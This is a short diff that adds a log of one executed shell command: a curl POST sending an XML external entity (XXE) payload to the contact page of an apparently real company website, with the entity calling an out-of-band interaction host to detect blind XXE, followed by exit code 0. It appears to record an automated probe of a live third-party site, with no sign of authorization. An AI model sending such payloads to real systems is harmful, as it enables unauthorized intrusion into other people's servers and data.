@@ -1,0 +1,4 @@
+# command: timeout 20 curl -s -m 18 -o /dev/null -X POST -H 'Content-Type: application/xml' --data-binary '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://oob4a745578e1bc.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/xxe">]><r>&xxe;</r>' 'https://www.infinitycapital.bh/contact?x=1'
+# exit_code: 0
+# ---
+
